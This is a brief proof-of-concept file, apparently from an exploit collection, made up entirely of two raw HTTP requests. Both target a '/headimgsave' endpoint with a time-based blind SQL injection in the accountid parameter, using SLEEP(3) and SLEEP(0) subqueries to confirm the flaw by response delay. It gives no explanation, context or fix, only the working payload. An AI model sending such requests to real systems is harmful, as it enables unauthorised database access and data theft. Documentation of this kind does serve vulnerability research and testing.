## poc：

```yaml
GET /headimgsave?accountid=1'+AND+(SELECT+5+FROM+(SELECT+SLEEP(3))qaz)--+ HTTP/1.1

Host:

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.1188.94 Safari/537.36

Connection: close


```

```yaml
GET /headimgsave?accountid=1'+AND+(SELECT+5+FROM+(SELECT+SLEEP(0))qaz)--+ HTTP/1.1

Host:

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.1188.94 Safari/537.36

Connection: close
```

